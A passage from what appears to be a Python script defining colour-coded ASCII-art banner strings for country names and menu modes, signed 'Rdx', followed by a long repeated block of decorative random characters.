\x1b[1;91m██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔════╝
\x1b[1;91m█████╗  ██████╔╝███████║██╔██╗ ██║██║     █████╗  
\x1b[1;91m██╔══╝  ██╔══██╗██╔══██║██║╚██╗██║██║     ██╔══╝  
\x1b[1;91m██║     ██║  ██║██║  ██║██║ ╚████║╚██████╗███████╗
\x1b[1;91m╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo25 =("""
\033[0;92m ██████╗ ███████╗██████╗ ███╗   ███╗ █████╗ ███╗   ██╗██╗   ██╗
\033[0;92m██╔════╝ ██╔════╝██╔══██╗████╗ ████║██╔══██╗████╗  ██║╚██╗ ██╔╝
\033[0;92m██║  ███╗█████╗  ██████╔╝██╔████╔██║███████║██╔██╗ ██║ ╚████╔╝ 
\033[0;92m██║   ██║██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══██║██║╚██╗██║  ╚██╔╝  
\033[0;92m╚██████╔╝███████╗██║  ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║   ██║   
\033[0;92m ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo26 =("""
\033[0;92m███╗   ███╗ █████╗ ██╗      █████╗ ██╗   ██╗███████╗██╗ █████╗     
\033[0;92m████╗ ████║██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██║██╔══██╗    
\033[0;92m██╔████╔██║███████║██║     ███████║ ╚████╔╝ ███████╗██║███████║    
\033[0;92m██║╚██╔╝██║██╔══██║██║     ██╔══██║  ╚██╔╝  ╚════██║██║██╔══██║    
\033[0;92m██║ ╚═╝ ██║██║  ██║███████╗██║  ██║   ██║   ███████║██║██║  ██║    
\033[0;92m╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝╚═╝  ╚═╝    
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo27 =("""
\033[0;91m███████╗██████╗ ██╗              ██╗      █████╗ ███╗   ██╗██╗  ██╗ █████╗     
\033[0;91m██╔════╝██╔══██╗██║              ██║     ██╔══██╗████╗  ██║██║ ██╔╝██╔══██╗    
\033[0;91m███████╗██████╔╝██║    █████╗    ██║     ███████║██╔██╗ ██║█████╔╝ ███████║    
\033[0;91m╚════██║██╔══██╗██║    ╚════╝    ██║     ██╔══██║██║╚██╗██║██╔═██╗ ██╔══██║    
\033[0;91m███████║██║  ██║██║              ███████╗██║  ██║██║ ╚████║██║  ██╗██║  ██║    
\033[0;91m╚══════╝╚═╝  ╚═╝╚═╝              ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo28 =("""
\033[0;92m████████╗██╗   ██╗██████╗ ██╗  ██╗███████╗██╗   ██╗
\033[0;92m╚══██╔══╝██║   ██║██╔══██╗██║ ██╔╝██╔════╝╚██╗ ██╔╝
\033[0;92m   ██║   ██║   ██║██████╔╝█████╔╝ █████╗   ╚████╔╝ 
\033[0;92m   ██║   ██║   ██║██╔══██╗██╔═██╗ ██╔══╝    ╚██╔╝  
 \033[0;92m  ██║   ╚██████╔╝██║  ██║██║  ██╗███████╗   ██║   
 \033[0;92m  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo29 =("""
\033[0;92m██╗   ██╗        █████╗        ███████╗   
\033[0;92m██║   ██║       ██╔══██╗       ██╔════╝   
\033[0;92m██║   ██║       ███████║       █████╗     
\033[0;92m██║   ██║       ██╔══██║       ██╔══╝     
\033[0;92m╚██████╔╝██╗    ██║  ██║██╗    ███████╗██╗
\033[0;92m ╚═════╝ ╚═╝    ╚═╝  ╚═╝╚═╝    ╚══════╝╚═╝
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo30 =("""
\033[0;92m███████╗ █████╗ ██╗   ██╗██████╗ ██╗       █████╗ ██████╗  █████╗ ██████╗ ██╗ █████╗ 
\033[0;92m██╔════╝██╔══██╗██║   ██║██╔══██╗██║      ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
\033[0;92m███████╗███████║██║   ██║██║  ██║██║█████╗███████║██████╔╝███████║██████╔╝██║███████║
\033[0;92m╚════██║██╔══██║██║   ██║██║  ██║██║╚════╝██╔══██║██╔══██╗██╔══██║██╔══██╗██║██╔══██║
\033[0;92m███████║██║  ██║╚██████╔╝██████╔╝██║      ██║  ██║██║  ██║██║  ██║██████╔╝██║██║  ██║
\033[0;92m╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝
                                                                                     
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo31 =("""
\x1b[1;91m██╗███████╗██████╗  █████╗ ███████╗██╗     
\x1b[1;91m██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║     
\x1b[1;91m██║███████╗██████╔╝███████║█████╗  ██║     
\x1b[1;91m██║╚════██║██╔══██╗██╔══██║██╔══╝  ██║     
\x1b[1;91m██║███████║██║  ██║██║  ██║███████╗███████╗
\x1b[1;91m╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo32 =("""
\033[0;92m██╗██████╗  █████╗ ███╗   ██╗
\033[0;92m██║██╔══██╗██╔══██╗████╗  ██║
\033[0;92m██║██████╔╝███████║██╔██╗ ██║
\033[0;92m██║██╔══██╗██╔══██║██║╚██╗██║
\033[0;92m██║██║  ██║██║  ██║██║ ╚████║
\033[0;92m╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo33 =("""
\033[0;96m███████╗    ███╗   ███╗ █████╗ ██╗██╗     
\033[0;96m██╔════╝    ████╗ ████║██╔══██╗██║██║     
\033[0;96m█████╗█████╗██╔████╔██║███████║██║██║     
\033[0;96m██╔══╝╚════╝██║╚██╔╝██║██╔══██║██║██║     
\033[0;96m███████╗    ██║ ╚═╝ ██║██║  ██║██║███████╗
\033[0;96m╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
\033[1;92m====================================================""")
logo34 =("""
\033[0;96m██████  ███████ ███    ███  ██████  
\033[0;96m██   ██ ██      ████  ████ ██    ██ 
\033[0;96m██   ██ █████   ██ ████ ██ ██    ██ 
\033[0;96m██   ██ ██      ██  ██  ██ ██    ██ 
\033[0;96m██████  ███████ ██      ██  ██████  
\033[1;92m====================================================""")                              
logo35 =("""
\033[0;96m██████   █████  ███    ██ ██████   ██████  ███    ███ 
\033[0;96m██   ██ ██   ██ ████   ██ ██   ██ ██    ██ ████  ████ 
\033[0;96m██████  ███████ ██ ██  ██ ██   ██ ██    ██ ██ ████ ██ 
\033[0;96m██   ██ ██   ██ ██  ██ ██ ██   ██ ██    ██ ██  ██  ██ 
\033[0;96m██   ██ ██   ██ ██   ████ ██████   ██████  ██      ██ 
\033[1;92m====================================================""")
logo36 =("""
\033[0;96m██      ██ ███    ███ ██ ████████ ███████     
\033[0;96m██      ██ ████  ████ ██    ██    ██          
\033[0;96m██      ██ ██ ████ ██ ██    ██    ███████     
\033[0;96m██      ██ ██  ██  ██ ██    ██         ██     
\033[0;96m███████ ██ ██      ██ ██    ██    ███████     
\033[1;92m====================================================""")




logo53 =("""
\033[0;92m0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
